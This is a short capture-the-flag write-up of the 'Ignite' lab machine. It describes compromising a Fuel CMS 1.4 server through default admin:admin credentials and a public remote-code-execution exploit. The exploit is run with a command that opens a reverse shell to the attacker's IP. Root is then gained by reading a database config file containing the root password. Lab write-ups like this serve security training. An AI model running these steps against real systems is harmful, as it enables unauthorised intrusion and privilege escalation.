Ignite

Target IP: 10.10.208.249

A new start-up has a few issues with their web server.

Scanning


There is only one TCP port open on the target machine: HTTP on port 80. From the nmap scan above, it looks like the target machine is running Fuel CMS on port 80.

Enumeration

Port 80: HTTP

The default Fuel CMS webpage above is displayed for this application. This 1.4 version application is vulnerable to remote code execution, but I wish to enumerate further before exploiting it. The default credential for this application is admin:admin.


After using the credential admin:admin at http://10.10.208.249/fuel/login/, I gained access to the web application on this port. It looks like the default credential has not been changed.

Exploitation


After some manual enumeration, I did not find anything useful so I decided to run the exploit. The exploit I used is shown above. I downloaded this on my machine and ran it against the target machine.


I used the command python3 exp.py http://10.10.208.249 10.14.55.153 8443. Now I have access to the target machine from my machine on port 8443.

Privilege Escalation


After plenty of manual enumeration, I finally escalated my privileges to root. Running find / -writable -type f 2>/dev/null shows /var/www/html/fuel/application/config/database.php is readable.


This file contains the credential root:mememe. And using this password mememe against the user root to switch user worked. Now I have root access on the target machine.
